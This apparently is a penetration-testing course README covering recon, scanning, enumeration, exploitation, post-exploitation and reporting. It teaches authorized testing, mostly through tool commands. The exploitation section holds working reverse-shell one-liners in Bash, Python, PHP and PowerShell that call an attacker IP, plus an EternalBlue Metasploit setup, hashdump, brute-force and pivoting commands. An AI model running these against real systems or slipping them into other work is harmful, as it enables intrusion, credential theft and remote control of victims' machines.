# ⚔️ Penetration Testing Methodology

## Professional Penetration Testing — From Recon to Report

---

## 📌 Overview

Penetration testing is the authorized simulation of real-world attacks to identify vulnerabilities before malicious hackers do. This section covers the complete methodology, tools, and professional practices.

---

## Penetration Testing Phases

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│ 1. RECON     │───→│ 2. SCANNING  │───→│3. ENUMERATION│
│              │    │              │    │              │
│ Gather info  │    │ Find targets │    │ Deep dive    │
└──────────────┘    └──────────────┘    └──────┬───────┘
                                               │
┌──────────────┐    ┌──────────────┐    ┌──────▼───────┐
│ 6. REPORTING │←───│5. POST-EXPLOIT│←──│4. EXPLOITATION│
│              │    │              │    │              │
│ Document all │    │ Escalate,    │    │ Gain access  │
│              │    │ pivot, loot  │    │              │
└──────────────┘    └──────────────┘    └──────────────┘
```

---

## Phase 1: Reconnaissance

### Passive Reconnaissance (No direct contact with target)

```bash
# WHOIS lookup
whois target.com

# DNS enumeration
dig target.com ANY
dig target.com MX
dig target.com NS
host -t axfr target.com ns1.target.com    # Zone transfer attempt

# Subdomain discovery
subfinder -d target.com
amass enum -passive -d target.com
assetfinder target.com

# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:bak | ext:log

# Shodan
shodan search hostname:target.com
shodan host 1.2.3.4

# Certificate Transparency
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# Wayback Machine
waybackurls target.com

# Email harvesting
theHarvester -d target.com -b all

# Social media / LinkedIn (identify employees, tech stack)
```

### Active Reconnaissance

```bash
# Host discovery
nmap -sn 192.168.1.0/24              # Ping sweep
nmap -sn -PS22,80,443 10.10.10.0/24  # TCP SYN discovery

# DNS brute force
dnsenum target.com
fierce --domain target.com
```

---

## Phase 2: Scanning

### Nmap — The Essential Tool

```bash
# Host discovery
nmap -sn 10.10.10.0/24

# Basic port scan (top 1000 ports)
nmap 10.10.10.100

# Full port scan (all 65535 ports)
nmap -p- 10.10.10.100

# Service version detection
nmap -sV 10.10.10.100

# OS detection
nmap -O 10.10.10.100

# Script scanning (vulnerability detection)
nmap -sC 10.10.10.100

# Aggressive scan (OS + version + scripts + traceroute)
nmap -A 10.10.10.100

# THE GO-TO COMMAND for CTF/pentesting:
nmap -sCV -p- -oN scan.txt 10.10.10.100

# Stealth SYN scan (doesn't complete TCP handshake)
nmap -sS 10.10.10.100

# UDP scan (slow but important!)
nmap -sU --top-ports 100 10.10.10.100

# Specific script categories
nmap --script=vuln 10.10.10.100
nmap --script=smb-vuln* 10.10.10.100
nmap --script=http-enum 10.10.10.100

# Output formats
nmap -oN normal.txt 10.10.10.100     # Normal output
nmap -oX xml_output.xml 10.10.10.100 # XML
nmap -oG grep_output.txt 10.10.10.100 # Grepable
nmap -oA all_formats 10.10.10.100    # All formats
```

### Nmap Scan Types

| Flag | Scan Type | Description | Stealth |
|------|-----------|-------------|---------|
| -sS | SYN Scan | Half-open (default with root) | High |
| -sT | TCP Connect | Full TCP connection | Low |
| -sU | UDP Scan | Sends UDP packets | Medium |
| -sN | NULL Scan | No flags set | High |
| -sF | FIN Scan | FIN flag only | High |
| -sX | Xmas Scan | FIN+PSH+URG flags | High |
| -sA | ACK Scan | Detect firewall rules | High |
| -sV | Version Scan | Detect service versions | Low |

### Vulnerability Scanning

```bash
# Nmap vulnerability scripts
nmap --script vuln 10.10.10.100

# Nikto (web server scanner)
nikto -h http://10.10.10.100

# Nuclei (modern vulnerability scanner)
nuclei -u http://10.10.10.100

# OpenVAS / Nessus (comprehensive scanners)
# These require separate setup
```

---

## Phase 3: Enumeration

### Service-Specific Enumeration

#### SMB (Port 445)
```bash
# Enumerate shares
smbclient -L //10.10.10.100 -N
smbmap -H 10.10.10.100
crackmapexec smb 10.10.10.100 --shares

# Connect to share
smbclient //10.10.10.100/share -N

# Enum4linux (comprehensive SMB enumeration)
enum4linux -a 10.10.10.100
```

#### HTTP/HTTPS (Port 80/443)
```bash
# Directory brute force
gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://10.10.10.100 -w /usr/share/seclists/Discovery/Web-Content/common.txt
dirsearch -u http://10.10.10.100

# Technology fingerprinting
whatweb http://10.10.10.100
wappalyzer (browser extension)

# Virtual host discovery
gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

#### SSH (Port 22)
```bash
# Banner grab
nc -nv 10.10.10.100 22

# Brute force (with permission only!)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.100
```

#### FTP (Port 21)
```bash
# Check anonymous login
ftp 10.10.10.100
# Username: anonymous, Password: (empty)

# Brute force
hydra -l admin -P wordlist.txt ftp://10.10.10.100
```

---

## Phase 4: Exploitation

### Metasploit Framework

```bash
# Start Metasploit
msfconsole

# Search for exploits
search eternalblue
search type:exploit platform:windows smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set target
set RHOSTS 10.10.10.100
set LHOST 10.10.14.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run exploit
exploit
# or
run

# Meterpreter commands (after successful exploitation)
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getsystem           # Attempt privilege escalation
meterpreter > hashdump            # Dump password hashes
meterpreter > shell               # Drop to system shell
meterpreter > upload file.exe     # Upload file
meterpreter > download file.txt   # Download file
meterpreter > migrate PID         # Migrate to another process
meterpreter > ps                  # List processes
```

### Manual Exploitation

```bash
# Reverse shell listener
nc -lvnp 4444

# Common reverse shells:
# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Shell Upgrade (Stabilize Your Shell)

```bash
# After getting basic shell, upgrade to fully interactive:

# Method 1: Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then: Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Method 2: Script
script /dev/null -c bash

# Method 3: rlwrap (on your machine)
rlwrap nc -lvnp 4444
```

### Password Cracking

```bash
# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt

# Hashcat (GPU-accelerated)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt    # MD5
hashcat -m 1000 hash.txt rockyou.txt                       # NTLM
hashcat -m 1800 hash.txt rockyou.txt                       # SHA-512 (Linux)

# Hydra (online brute force)
hydra -l admin -P rockyou.txt 10.10.10.100 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
hydra -l admin -P rockyou.txt ssh://10.10.10.100
hydra -l admin -P rockyou.txt ftp://10.10.10.100
```

---

## Phase 5: Post-Exploitation

### After Getting Access

1. **Stabilize shell** (upgrade to interactive)
2. **Enumerate** (LinPEAS/WinPEAS)
3. **Escalate privileges** (if not already root/admin)
4. **Harvest credentials** (password files, hashes, tokens)
5. **Establish persistence** (SSH keys, backdoor users)
6. **Pivot** (reach other systems on the network)
7. **Loot** (find valuable data)

### Pivoting

```bash
# SSH tunnel to access internal network
ssh -D 1080 user@compromised-host
# Configure proxychains to use SOCKS5 on 1080

# Then scan internal network through tunnel:
proxychains nmap -sT 172.16.0.0/24

# Chisel (alternative for pivoting)
# On attacker (server):
./chisel server -p 8000 --reverse
# On target (client):
./chisel client ATTACKER_IP:8000 R:socks
```

---

## Phase 6: Reporting

### Professional Report Structure

```
1. Executive Summary
   - High-level overview for management
   - Critical findings
   - Overall risk rating

2. Scope & Methodology
   - What was tested
   - Testing approach
   - Tools used
   - Timeline

3. Findings (for each vulnerability)
   - Title
   - Severity (Critical/High/Medium/Low/Info)
   - CVSS Score
   - Description
   - Impact
   - Steps to Reproduce
   - Evidence (screenshots, commands)
   - Remediation Recommendations

4. Remediation Summary
   - Prioritized action items
   - Quick wins vs long-term fixes

5. Appendix
   - Detailed scan results
   - Raw data
```

---

## Tools Summary

| Phase | Tools |
|-------|-------|
| Recon | WHOIS, theHarvester, Shodan, Google Dorks |
| Scanning | Nmap, Masscan, Nikto |
| Enumeration | enum4linux, gobuster, smbclient |
| Exploitation | Metasploit, manual exploits, Hydra |
| Post-Exploit | LinPEAS/WinPEAS, Mimikatz, Chisel |
| Reporting | CherryTree, Obsidian, custom templates |

---

## Exercises

1. Perform a full pentest on a TryHackMe or HackTheBox machine
2. Write a professional penetration testing report
3. Practice Nmap scanning on Scanme.nmap.org (authorized!)
4. Set up Metasploit and exploit Metasploitable 2
5. Build your own methodology checklist

---

**Next:** → [10-Active-Directory](../10-Active-Directory/README.md)

*"A penetration test is only as good as its report. If you can't explain it clearly, you didn't fully understand it."*
